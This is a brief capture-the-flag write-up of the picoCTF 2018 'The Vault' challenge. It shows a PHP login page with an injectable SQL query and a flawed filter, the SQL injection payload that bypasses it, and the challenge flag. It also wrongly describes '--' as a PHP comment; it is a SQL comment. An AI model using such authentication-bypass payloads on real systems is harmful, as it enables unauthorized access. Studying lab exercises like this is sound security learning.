# The Vault - Points: 250

1. First, lets go through the website : http://2018shell.picoctf.com:22430/
2. Then, we check the source code : 
    ```
    <?php
      ini_set('error_reporting', E_ALL);
      ini_set('display_errors', 'On');

      include "config.php";
      $con = new SQLite3($database_file);

      $username = $_POST["username"];
      $password = $_POST["password"];
      $debug = $_POST["debug"];
      $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";

      if (intval($debug)) {
        echo "<pre>";
        echo "username: ", htmlspecialchars($username), "\n";
        echo "password: ", htmlspecialchars($password), "\n";
        echo "SQL query: ", htmlspecialchars($query), "\n";
        echo "</pre>";
      }

      //validation check
      $pattern ="/.*['\"].*OR.*/i";
      $user_match = preg_match($pattern, $username);
      $password_match = preg_match($pattern, $username);
      if($user_match + $password_match > 0)  {
        echo "<h1>SQLi detected.</h1>";
      }
      else {
        $result = $con->query($query);
        $row = $result->fetchArray();

        if ($row) {
          echo "<h1>Logged in!</h1>";
          echo "<p>Your flag is: $FLAG</p>";
        } else {
          echo "<h1>Login failed.</h1>";
        }
      }

    ?>
    ```
    As you can see, there are some keywords, which are forbidden. After thinking for a while, I come up a payload : 
    ```
    username : admin' --
    password : 123
    ```
    The main reason is "--" means as same as "//" or "#" in php and the filter didn't handle this.
3. Here is the flag : picoCTF{w3lc0m3_t0_th3_vau1t_06857925}
